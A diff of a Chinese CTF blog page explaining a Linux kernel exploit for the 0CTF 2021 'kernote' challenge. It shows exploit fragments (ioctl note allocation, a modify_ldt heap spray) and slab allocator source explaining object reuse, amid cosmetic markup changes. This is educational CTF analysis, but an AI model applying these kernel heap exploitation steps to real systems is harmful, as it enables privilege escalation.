 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -937,7 +949,6 @@ out_unlock<span class="token operator">:</span>
 
     <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>首先的猜想是 free_list 只有这么一个 object，随后我尝试了在 exp 开头通过 <code>fd = open(&quot;/proc/self/stat&quot;); close(fd);</code> 构造多个 seq_operations 并释放，最后发现 exp 仍可以正常 leak，看样子不是这个问题</p>
 <p>最后求助于源码，发现 slab 分配器在分配和释放时存在一个 cpu cache，分配和释放都会先操作这个 cache</p>
 <p>在调用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/mm/slab.c#L3031"><code>____cache_alloc</code></a> 时，可以发现 object 从 cpu cache 中分配</p>
@@ -960,7 +971,6 @@ out_unlock<span class="token operator">:</span>
 <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 	<span class="token keyword">return</span> objp<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>释放时，当 cpu_cache 满了，调用 <code>cache_flusharray</code> 把 cpu_cache 里的 object 扔到 slab free_list 里，最后再把当前要释放的 object 扔到 cpu_cache 里</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">___cache_free</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kmem_cache</span> <span class="token operator">*</span>cachep<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>objp<span class="token punctuation">,</span>
 		<span class="token keyword">unsigned</span> <span class="token keyword">long</span> caller<span class="token punctuation">)</span>
@@ -990,11 +1000,10 @@ out_unlock<span class="token operator">:</span>
 		<span class="token keyword">return</span><span class="token punctuation">;</span>
 	ac<span class="token operator">-></span>entry<span class="token punctuation">[</span>ac<span class="token operator">-></span>avail<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> objp<span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
 <p>所以在这个过程中，分配的 object 一定是最后一次释放的 object，没有受到 SLAB_FREELIST_RANDOM 的影响</p>
 <p>于此同时也可以看到，slab 分配器的 SLAB_FREELIST_HARDENED 机制不同于文章开头对于 slub 分配器该机制描述的那样，更具体的内容可以自行查阅源码</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>文中未明确提到的参考链接如下：</p>
+<h2 id="参考">参考</h2>
+<p>文中未明确提到的参考链接如下：</p>
 <ol>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote">https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/#0x02-kernote</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote">https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote</a></li>
@@ -1093,13 +1102,13 @@ out_unlock<span class="token operator">:</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
